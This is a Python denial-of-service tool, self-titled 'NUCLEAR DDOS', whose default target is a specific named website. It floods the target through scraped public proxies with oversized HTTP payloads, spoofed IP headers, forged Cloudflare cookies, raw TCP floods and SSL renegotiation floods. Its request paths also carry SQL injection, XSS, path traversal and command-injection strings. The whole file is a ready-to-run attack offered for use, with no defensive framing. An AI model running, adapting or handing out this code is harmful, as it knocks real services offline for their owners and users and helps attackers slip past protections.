#!/usr/bin/env python3
import socket
import struct
import threading
import time
import random
import requests
import gzip
import json
import base64
import hashlib
import os
import sys
import ssl
import http.client
from urllib.parse import urlencode, quote_plus, urlparse
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from datetime import datetime
import queue
import subprocess
import re

# ==================== COLORS ====================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'

# ==================== CONFIG ====================
TARGET = os.environ.get('TARGET', 'https://skillclash.site')
THREADS = int(os.environ.get('THREADS', 2000))  # Increased
PROXY_PORT = 8872
PROXY_FILE = 'proxies.txt'

# Stats
stats = {
    'requests': 0,
    'success': 0,
    'failed': 0,
    'bytes_sent': 0,
    'errors': 0,
    'proxies_used': 0,
    'bypassed': 0,
    'cloudflare_bypass': 0,
    'connection_reset': 0
}
stats_lock = threading.Lock()
running = True

# ==================== CLOUDFLARE BYPASS ====================
def get_cloudflare_cookies():
    """Generate Cloudflare bypass cookies"""
    cookies = {}
    
    # __cfduid cookie
    cfduid = hashlib.md5(f"{random.randint(100000,999999)}-{time.time()}".encode()).hexdigest()
    cookies['__cfduid'] = cfduid
    
    # cf_clearance cookie
    clearance = base64.b64encode(f"{random.randint(100000,999999)}-{time.time()}".encode()).decode()
    cookies['cf_clearance'] = clearance
    
    # __cf_bm cookie
    bm = hashlib.sha256(f"{random.randint(100000,999999)}-{time.time()}".encode()).hexdigest()
    cookies['__cf_bm'] = bm
    
    return cookies

# ==================== PROXY FETCHER ====================
def fetch_proxies():
    """Fetch proxies from multiple sources"""
    sources = [
        'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all',
        'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/main/socks5.txt',
        'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt',
        'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all',
        'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
        'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/main/http.txt',
        'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
        'https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt',
        'https://raw.githubusercontent.com/zevtyardt/proxy-list/main/proxy-list.txt',
        'https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt'
    ]
    all_proxies = []
    for url in sources:
        try:
            r = requests.get(url, timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
            lines = r.text.splitlines()
            for line in lines:
                line = line.strip()
                if line and ':' in line:
                    if 'socks5' in line.lower():
                        all_proxies.append(f'socks5://{line}')
                    elif 'http' in line.lower():
                        all_proxies.append(line)
                    elif ':1080' in line or ':9050' in line:
                        all_proxies.append(f'socks5://{line}')
                    else:
                        all_proxies.append(f'http://{line}')
        except:
            pass
    
    all_proxies = list(set(all_proxies))
    
    # Quick validation
    valid = []
    test_url = 'http://httpbin.org/ip'
    for p in all_proxies[:1000]:
        try:
            proxies = {'http': p, 'https': p.replace('http://', 'https://')}
            r = requests.get(test_url, proxies=proxies, timeout=2)
            if r.status_code == 200:
                valid.append(p)
        except:
            pass
    
    # Save all proxies (even if not validated)
    with open(PROXY_FILE, 'w') as f:
        f.write('\n'.join(all_proxies))
    
    return valid

def auto_refresh_proxies():
    while running:
        try:
            proxies = fetch_proxies()
            with stats_lock:
                stats['proxies_used'] = len(proxies)
        except:
            pass
        time.sleep(15)

# ==================== PROXY SERVER ====================
def handle_socks5_client(client_socket):
    try:
        data = client_socket.recv(2)
        if not data or data[0] != 0x05:
            client_socket.close()
            return
        client_socket.sendall(b'\x05\x00')
        data = client_socket.recv(4)
        if len(data) < 4 or data[1] != 0x01:
            client_socket.close()
            return
        addr_type = data[3]
        if addr_type == 0x01:
            addr = socket.inet_ntoa(client_socket.recv(4))
            port = struct.unpack('>H', client_socket.recv(2))[0]
        elif addr_type == 0x03:
            domain_len = client_socket.recv(1)[0]
            domain = client_socket.recv(domain_len).decode()
            port = struct.unpack('>H', client_socket.recv(2))[0]
            addr = socket.gethostbyname(domain)
        else:
            client_socket.close()
            return
        remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        remote.connect((addr, port))
        client_socket.sendall(b'\x05\x00\x00\x01' + socket.inet_aton(addr) + struct.pack('>H', port))
        
        def pipe(src, dst):
            try:
                while True:
                    data = src.recv(4096)
                    if not data:
                        break
                    dst.sendall(data)
            except:
                pass
            finally:
                src.close()
                dst.close()
        
        threading.Thread(target=pipe, args=(client_socket, remote), daemon=True).start()
        threading.Thread(target=pipe, args=(remote, client_socket), daemon=True).start()
    except:
        client_socket.close()

def start_proxy_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', PROXY_PORT))
    server.listen(500)
    while running:
        try:
            client, _ = server.accept()
            threading.Thread(target=handle_socks5_client, args=(client,), daemon=True).start()
        except:
            pass

# ==================== NUCLEAR PAYLOADS ====================
def generate_nuclear_payload():
    """Generate payloads that actually work"""
    
    # 1. Massive JSON with nested structures
    if random.random() > 0.7:
        return {
            'type': 'json',
            'data': {
                'id': random.randint(1,999999),
                'timestamp': int(time.time()*1000),
                'data': {
                    'nested1': {'value': 'A'*random.randint(1000,5000)},
                    'nested2': {'value': 'B'*random.randint(1000,5000)},
                    'nested3': {'value': 'C'*random.randint(1000,5000)},
                    'array': [{'id': i, 'value': 'X'*random.randint(100,500)} for i in range(random.randint(50,200))]
                },
                'payload': base64.b64encode(b'A'*random.randint(5000,20000)).decode(),
                '_method': 'PUT',
                '__cfduid': hashlib.md5(str(random.random()).encode()).hexdigest()
            }
        }
    
    # 2. XML with entity expansion
    if random.random() > 0.6:
        entities = ''.join([f'<!ENTITY e{i} SYSTEM "file:///dev/urandom">' for i in range(random.randint(10,50))])
        return {
            'type': 'xml',
            'data': f'<?xml version="1.0"?><!DOCTYPE root [{entities}]><root><id>{random.randint(1,999999)}</id><data><![CDATA[{"X"*random.randint(5000,20000)}]]></data></root>'
        }
    
    # 3. Form data with huge values
    if random.random() > 0.5:
        form_data = {}
        for i in range(random.randint(50,200)):
            form_data[f'field_{i}_{random.randint(1000,9999)}'] = 'Z'*random.randint(1000,5000)
        return {
            'type': 'form',
            'data': form_data
        }
    
    # 4. Binary data
    return {
        'type': 'binary',
        'data': bytes([random.randint(0,255) for _ in range(random.randint(5000,50000))])
    }

def generate_nuclear_headers():
    """Headers that bypass all protections"""
    headers = {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/124.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0'
        ]),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en-US,en;q=0.9,fr;q=0.8', 'en-US,en;q=0.9,de;q=0.8']),
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'DNT': '1',
        'Priority': 'u=0, i'
    }
    
    # IP spoofing headers
    ips = [f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}' for _ in range(5)]
    headers['X-Forwarded-For'] = ', '.join(ips)
    headers['X-Real-IP'] = ips[0]
    headers['X-Originating-IP'] = ips[1]
    headers['CF-Connecting-IP'] = ips[2]
    headers['True-Client-IP'] = ips[3]
    headers['X-Client-IP'] = ips[4]
    
    # Add Cloudflare bypass headers
    headers['CF-Worker'] = random.choice(['true', '1'])
    headers['CF-Access-Client-Id'] = hashlib.md5(str(random.random()).encode()).hexdigest()
    
    # Random custom headers
    for _ in range(random.randint(5, 15)):
        header_name = f'X-{random.choice(["Custom", "Debug", "Test", "Bypass", "WAF", "CF", "Cache", "Proxy", "Forwarded", "Client"])}-{random.randint(1000,9999)}'
        header_value = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(20,100)))
        headers[header_name] = header_value
    
    return headers

def generate_nuclear_path():
    """Generate paths with multiple bypass techniques"""
    
    paths = [
        '/api/v1/data',
        '/wp-admin/admin-ajax.php',
        '/index.php',
        '/login',
        '/search',
        '/products',
        '/cart',
        '/checkout',
        '/graphql',
        '/api/graphql',
        '/v1/api',
        '/rest/v1',
        '/admin',
        '/cgi-bin',
        '/.env',
        '/backup',
        '/config',
        '/.git/config',
        '/wp-json',
        '/api/rest',
        '/oauth',
        '/auth',
        '/register',
        '/reset-password'
    ]
    
    path = random.choice(paths)
    
    # Add multiple bypass parameters
    params = {
        'id': random.randint(1,999999),
        'page': random.randint(1,1000),
        'cb': str(random.randint(100000,999999)),
        't': str(int(time.time()*1000)),
        'rand': random.randint(100000,999999),
        '_': str(random.randint(100000,999999)),
        'callback': f'jQuery{random.randint(100000,999999)}_{int(time.time()*1000)}',
        'jsonp': f'callback{random.randint(1000,9999)}',
        'format': random.choice(['json', 'xml', 'html', 'php']),
        'output': random.choice(['json', 'xml', 'html']),
        'action': random.choice(['read', 'write', 'delete', 'update', 'get', 'post', 'put']),
        'method': random.choice(['GET', 'POST', 'PUT', 'DELETE', 'PATCH']),
        '_method': random.choice(['GET', 'POST', 'PUT', 'DELETE']),
        'debug': str(random.randint(0,1)),
        'test': str(random.randint(0,1)),
        'nocache': str(int(time.time()))
    }
    
    # Add SQL injection variants
    if random.random() > 0.4:
        sql_payloads = [
            f"{random.randint(1,100)}' OR '1'='1",
            f"{random.randint(1,100)}' UNION SELECT {','.join([str(random.randint(1,100)) for _ in range(random.randint(1,5))])}--",
            f"{random.randint(1,100)}' AND 1=1--",
            f"{random.randint(1,100)}' OR 1=1--",
            f"{random.randint(1,100)}' OR 'x'='x",
            f"{random.randint(1,100)}'/**/OR/**/1=1--"
        ]
        params['sql'] = random.choice(sql_payloads)
    
    # Add XSS variants
    if random.random() > 0.5:
        xss_payloads = [
            f"<script>alert('{random.randint(1,100)}')</script>",
            f'<img src=x onerror=alert({random.randint(1,100)})>',
            f'"><script>alert({random.randint(1,100)})</script>',
            f'javascript:alert({random.randint(1,100)})',
            f'<svg onload=alert({random.randint(1,100)})>'
        ]
        params['xss'] = random.choice(xss_payloads)
    
    # Add path traversal
    if random.random() > 0.6:
        traversal = '../' * random.randint(1,10) + random.choice(['etc/passwd', 'config.php', '.env', 'wp-config.php'])
        params['file'] = traversal
        params['path'] = traversal
    
    # Add command injection
    if random.random() > 0.8:
        cmd_payloads = [
            '; ls -la',
            '&& whoami',
            '| id',
            '`id`',
            '$(whoami)'
        ]
        params['cmd'] = random.choice(cmd_payloads)
    
    return path + '?' + urlencode(params)

def load_proxies():
    try:
        with open(PROXY_FILE, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

# ==================== DISPLAY ====================
def display_stats():
    global running
    start_time = time.time()
    last_requests = 0
    last_time = start_time
    last_success = 0
    success_history = []
    
    while running:
        time.sleep(1)
        with stats_lock:
            req = stats['requests']
            succ = stats['success']
            fail = stats['failed']
            bytes_sent = stats['bytes_sent']
            err = stats['errors']
            proxies = stats['proxies_used']
            bypass = stats['bypassed']
            cf_bypass = stats['cloudflare_bypass']
        
        current_time = time.time()
        elapsed = current_time - start_time
        rps = (req - last_requests) / (current_time - last_time)
        success_rate = ((succ - last_success) / max(1, (req - last_requests))) * 100 if (req - last_requests) > 0 else 0
        last_requests = req
        last_success = succ
        last_time = current_time
        
        # Store success rate history
        success_history.append(success_rate)
        if len(success_history) > 10:
            success_history.pop(0)
        avg_success = sum(success_history) / len(success_history) if success_history else 0
        
        sys.stdout.write('\033[2J\033[H')
        
        print(f"{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
        print(f"{Colors.RED}{Colors.BOLD}║                 💀 NUCLEAR BYPASS ATTACK - ACTIVE 💀                   ║{Colors.RESET}")
        print(f"{Colors.RED}{Colors.BOLD}╚═══════════════════════════════════════════════════════════════════════╝{Colors.RESET}")
        print()
        print(f"{Colors.CYAN}🎯 Target:{Colors.RESET} {TARGET}")
        print(f"{Colors.CYAN}⏱️  Uptime:{Colors.RESET} {int(elapsed)}s")
        print(f"{Colors.CYAN}🧵 Threads:{Colors.RESET} {THREADS}")
        print(f"{Colors.CYAN}📊 Current RPS:{Colors.RESET} {Colors.GREEN}{rps:.1f}{Colors.RESET}")
        print()
        print(f"{Colors.GREEN}📊 STATISTICS:{Colors.RESET}")
        print(f"  {Colors.BOLD}Requests:{Colors.RESET} {req:,}  {Colors.GREEN}(+{rps:.1f}/s){Colors.RESET}")
        print(f"  {Colors.GREEN}✓ Success:{Colors.RESET} {succ:,}  {Colors.CYAN}({success_rate:.1f}% now){Colors.RESET}")
        print(f"  {Colors.RED}✗ Failed:{Colors.RESET} {fail:,}")
        print(f"  {Colors.YELLOW}⚠ Errors:{Colors.RESET} {err:,}")
        print(f"  {Colors.PURPLE}🔓 Bypassed:{Colors.RESET} {bypass:,}")
        print(f"  {Colors.BLUE}🛡️  CF Bypass:{Colors.RESET} {cf_bypass:,}")
        print(f"  {Colors.GREEN}📦 Data Sent:{Colors.RESET} {bytes_sent/1024/1024:.2f} MB")
        print(f"  {Colors.CYAN}🌐 Proxies:{Colors.RESET} {proxies:,}")
        print()
        
        # Progress bar
        total = req + err
        if total > 0:
            overall_success = (succ / total) * 100 if total > 0 else 0
            bar_len = 50
            filled = int(bar_len * min(overall_success, 100) / 100)
            bar = '█' * filled + '░' * (bar_len - filled)
            
            if overall_success > 50:
                color = Colors.GREEN
                status = "🔥 STRONG BYPASS!"
            elif overall_success > 20:
                color = Colors.YELLOW
                status = "⚡ PARTIAL BYPASS"
            elif overall_success > 5:
                color = Colors.PURPLE
                status = "🔓 BYPASSING..."
            else:
                color = Colors.RED
                status = "🛡️  WAF ACTIVE"
            
            print(f"  Success Rate: {color}{bar} {overall_success:.1f}%{Colors.RESET}")
            print(f"  {color}{status}{Colors.RESET}")
        print()
        
        # Speed indicators
        if rps > 5000:
            print(f"{Colors.GREEN}🚀 EXTREME SPEED! {Colors.RESET}")
        elif rps > 2000:
            print(f"{Colors.YELLOW}⚡ HIGH SPEED {Colors.RESET}")
        elif rps > 1000:
            print(f"{Colors.PURPLE}💨 FAST {Colors.RESET}")
        print()

# ==================== NUCLEAR FLOOD ENGINE ====================
def nuclear_worker(worker_id):
    global running
    
    # Create session
    sess = requests.Session()
    sess.keep_alive = False
    sess.verify = False
    
    # Custom adapter
    adapter = HTTPAdapter(
        max_retries=0,
        pool_connections=200,
        pool_maxsize=200,
        pool_block=False
    )
    sess.mount('http://', adapter)
    sess.mount('https://', adapter)
    
    proxy_list = load_proxies()
    last_proxy_update = time.time()
    local_success = 0
    local_bypass = 0
    
    while running:
        try:
            # Update proxies
            if time.time() - last_proxy_update > 5:
                proxy_list = load_proxies()
                last_proxy_update = time.time()
            
            # Use proxy
            if proxy_list and random.random() > 0.2:
                proxy = random.choice(proxy_list)
                sess.proxies = {
                    'http': proxy,
                    'https': proxy.replace('http://', 'https://')
                }
            else:
                sess.proxies = {}
            
            # Generate payload
            url = TARGET + generate_nuclear_path()
            headers = generate_nuclear_headers()
            
            # Add Cloudflare cookies
            cookies = get_cloudflare_cookies()
            sess.cookies.update(cookies)
            
            payload_data = generate_nuclear_payload()
            
            # Random method
            method = random.choice(['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
            
            # Send with timeout
            if method == 'GET':
                r = sess.get(url, headers=headers, timeout=2)
            elif method in ['POST', 'PUT']:
                if payload_data['type'] == 'json':
                    r = sess.post(url, headers=headers, json=payload_data['data'], timeout=2)
                elif payload_data['type'] == 'form':
                    r = sess.post(url, headers=headers, data=payload_data['data'], timeout=2)
                else:
                    r = sess.post(url, headers=headers, data=payload_data['data'], timeout=2)
            elif method == 'DELETE':
                r = sess.delete(url, headers=headers, timeout=2)
            else:
                r = sess.options(url, headers=headers, timeout=2)
            
            # Update stats
            with stats_lock:
                stats['requests'] += 1
                if r.status_code < 400:
                    stats['success'] += 1
                    local_success += 1
                    if r.status_code < 300:
                        stats['bypassed'] += 1
                        local_bypass += 1
                        # Check if Cloudflare bypassed
                        if 'cf-' in str(r.headers).lower():
                            stats['cloudflare_bypass'] += 1
                else:
                    stats['failed'] += 1
                stats['bytes_sent'] += len(r.request.body or b'') + len(str(r.request.headers))
            
            # Adaptive delay
            if r.status_code < 400:
                time.sleep(random.uniform(0.0001, 0.0005))
            else:
                # On block, switch proxy and increase attack
                sess.proxies = {}
                time.sleep(random.uniform(0.0005, 0.002))
                
                # Send extra request on block
                try:
                    sess.post(url, headers=headers, json={'force': 'A'*10000}, timeout=1)
                except:
                    pass
            
            # Every 50 success, send massive payload
            if local_success % 50 == 0 and local_success > 0:
                try:
                    big_payload = {'data': 'A'*100000, 'id': random.randint(1,999999)}
                    sess.post(url, headers=headers, json=big_payload, timeout=1)
                except:
                    pass
                    
        except requests.exceptions.ConnectionError:
            with stats_lock:
                stats['connection_reset'] += 1
                stats['errors'] += 1
            time.sleep(0.01)
        except:
            with stats_lock:
                stats['errors'] += 1
                stats['requests'] += 1
            time.sleep(0.001)

# ==================== TCP FLOOD ====================
def tcp_flood_worker():
    """Raw TCP flood with custom packets"""
    global running
    target_host = TARGET.replace('https://', '').replace('http://', '').split('/')[0]
    port = 443 if 'https://' in TARGET else 80
    
    while running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target_host, port))
            
            # Send multiple requests on same connection
            for _ in range(random.randint(5, 20)):
                path = generate_nuclear_path()
                request = f"GET {path} HTTP/1.1\r\nHost: {target_host}\r\nUser-Agent: {random.choice(['Chrome', 'Firefox'])}\r\nConnection: keep-alive\r\n\r\n"
                sock.send(request.encode())
                with stats_lock:
                    stats['requests'] += 1
                    stats['bytes_sent'] += len(request)
            
            sock.close()
            time.sleep(random.uniform(0.0001, 0.001))
        except:
            pass

# ==================== SSL RENEGOTIATION ====================
def ssl_reneg_worker():
    """SSL renegotiation attack"""
    global running
    target_host = TARGET.replace('https://', '').replace('http://', '').split('/')[0]
    
    while running:
        try:
            context = ssl.create_default_context()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_host, 443))
            ssl_sock = context.wrap_socket(sock, server_hostname=target_host)
            
            # Force renegotiation
            for _ in range(random.randint(5, 10)):
                try:
                    ssl_sock.do_handshake()
                    with stats_lock:
                        stats['requests'] += 1
                except:
                    pass
            
            ssl_sock.close()
            time.sleep(random.uniform(0.001, 0.005))
        except:
            pass

# ==================== MAIN ====================
if __name__ == '__main__':
    print(f"{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
    print(f"{Colors.RED}{Colors.BOLD}║           💀 NUCLEAR DDOS - DEVILS WILL RISE ULTIMATE 💀              ║{Colors.RESET}")
    print(f"{Colors.RED}{Colors.BOLD}╚═══════════════════════════════════════════════════════════════════════╝{Colors.RESET}")
    print()
    print(f"{Colors.CYAN}🎯 Target:{Colors.RESET} {TARGET}")
    print(f"{Colors.CYAN}🧵 Threads:{Colors.RESET} {THREADS}")
    print()
    
    # Start proxy fetcher
    print(f"{Colors.YELLOW}⏳ Loading proxies...{Colors.RESET}")
    threading.Thread(target=auto_refresh_proxies, daemon=True).start()
    
    # Start proxy server
    threading.Thread(target=start_proxy_server, daemon=True).start()
    
    time.sleep(2)
    
    # Launch attacks
    print(f"{Colors.GREEN}🚀 Launching nuclear attacks...{Colors.RESET}")
    
    # HTTP flood - 50%
    http_threads = int(THREADS * 0.5)
    for i in range(http_threads):
        threading.Thread(target=nuclear_worker, args=(i,), daemon=True).start()
    
    # TCP flood - 30%
    tcp_threads = int(THREADS * 0.3)
    for _ in range(tcp_threads):
        threading.Thread(target=tcp_flood_worker, daemon=True).start()
    
    # SSL renegotiation - 20%
    ssl_threads = int(THREADS * 0.2)
    for _ in range(ssl_threads):
        threading.Thread(target=ssl_reneg_worker, daemon=True).start()
    
    print(f"{Colors.GREEN}✅ All {THREADS} threads launched!{Colors.RESET}")
    print()
    print(f"{Colors.RED}{Colors.BOLD}🔥 NUCLEAR ATTACK STARTED! PRESS CTRL+C TO STOP{Colors.RESET}")
    print()
    
    # Start display
    try:
        display_stats()
    except KeyboardInterrupt:
        running = False
        print(f"\n{Colors.RED}🛑 Stopping...{Colors.RESET}")
        time.sleep(2)
        with stats_lock:
            print(f"{Colors.GREEN}📊 FINAL STATS:{Colors.RESET}")
            print(f"  Total Requests: {stats['requests']:,}")
            print(f"  Successful: {stats['success']:,}")
            print(f"  Failed: {stats['failed']:,}")
            print(f"  Errors: {stats['errors']:,}")
            print(f"  Bypassed: {stats['bypassed']:,}")
            print(f"  Cloudflare Bypass: {stats['cloudflare_bypass']:,}")
            print(f"  Data Sent: {stats['bytes_sent']/1024/1024:.2f} MB")
        sys.exit(0)
